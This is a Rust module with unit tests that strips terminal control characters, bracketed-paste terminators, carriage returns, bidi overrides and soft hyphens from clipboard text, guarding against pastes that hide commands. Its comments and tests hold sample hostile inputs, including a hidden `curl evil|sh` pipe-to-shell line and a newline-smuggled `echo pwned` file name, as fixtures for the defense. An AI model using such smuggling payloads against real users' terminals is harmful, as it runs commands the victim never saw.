//! What may go on the clipboard.
//!
//! The clipboard is pasted into a shell as often as into an editor, so it
//! must carry what the reader SAW and nothing the screen never showed. A
//! fenced block holding `echo harmless` + `ESC [201~` + NAK + `curl …|sh`
//! painted as one harmless line, and a copy of it ended bracketed paste
//! early, erased the line with Ctrl-U and left the hidden command to run.
//! Every frontend's clipboard write goes through these two functions.

/// Multi-line content — a selection, a code block, a quote, notes. Line
/// breaks and tabs are the content and survive; nothing else invisible does:
///
/// - C0 controls other than `\n` and `\t`, DEL, and C1 (U+0080–U+009F),
///   which a terminal acts on rather than shows. `ESC [201~` ends a
///   bracketed paste; NAK is Ctrl-U; BS rewrites what came before it.
/// - `\r`, always. In a CRLF source it precedes `\n`, so dropping it
///   normalizes the line ending to the `\n` the screen showed as one break;
///   a lone `\r` is a return-to-column-zero overwrite, which is exactly how
///   text the screen showed gets hidden in a terminal transcript of a paste.
/// - The bidi embeddings, overrides and isolates (U+202A–U+202E,
///   U+2066–U+2069). They reorder what a paste DISPLAYS without changing
///   what it executes — "Trojan Source" (CVE-2021-42574). The marks
///   U+200E/U+200F stay: they are ordinary in right-to-left prose and
///   reorder nothing on their own.
/// - The soft hyphen, which only ever shows at the end of a wrapped row and
///   would sit unseen inside the pasted word.
#[must_use]
pub fn text(s: &str) -> String {
    clean(s, false)
}

/// One field that is a single line by nature — a path, a URL, a heading, a
/// `file:line` reference. Everything [`text`] strips, and `\n` and `\t` too:
/// a newline in a FILE NAME is not content, it is a second command line.
#[must_use]
pub fn line(s: &str) -> String {
    clean(s, true)
}

fn clean(s: &str, one_line: bool) -> String {
    s.chars()
        .filter(|&c| match c {
            '\n' | '\t' => !one_line,
            '\u{AD}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' => false,
            // Cc: all of C0 (including `\r`), DEL and C1.
            c => !c.is_control(),
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    const ESC: char = '\u{1b}';

    #[test]
    fn text_keeps_line_breaks_and_tabs_and_drops_every_other_control() {
        let hostile =
            format!("echo harmless{ESC}[201~\u{15}curl evil|sh\u{8}\u{8}\n\tnext\u{7f}\u{9b}");
        assert_eq!(text(&hostile), "echo harmless[201~curl evil|sh\n\tnext");
    }

    #[test]
    fn crlf_becomes_lf_and_a_lone_cr_is_dropped() {
        assert_eq!(text("a\r\nb\rc"), "a\nbc");
    }

    #[test]
    fn bidi_overrides_and_soft_hyphens_never_reach_a_paste() {
        assert_eq!(
            text("a\u{202E}b\u{2066}c\u{2069}d\u{AD}e\u{200F}f"),
            "abcde\u{200F}f"
        );
    }

    #[test]
    fn line_also_drops_newlines_and_tabs() {
        let name = format!("q{ESC}[201~\necho pwned\n\t.md");
        assert_eq!(line(&name), "q[201~echo pwned.md");
    }
}
